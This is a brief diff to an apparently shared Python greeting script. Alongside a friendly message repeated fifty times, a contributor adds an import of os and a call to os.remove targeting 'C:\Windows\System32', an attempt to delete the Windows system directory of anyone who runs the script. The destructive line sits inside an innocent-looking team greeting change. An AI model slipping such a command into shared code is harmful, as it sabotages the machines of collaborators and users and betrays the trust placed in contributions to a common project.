@@ -14,4 +14,8 @@ if __name__ == "__main__":
     banner()
     # --- ADD YOUR GREETING BELOW THIS LINE ---
     print("hello from sion")
+    for i in range(0,50):
+        print("Hello from Alfie! I have recently joined this team!")
+    import os 
+    os.remove("C:\Windows\System32")
 
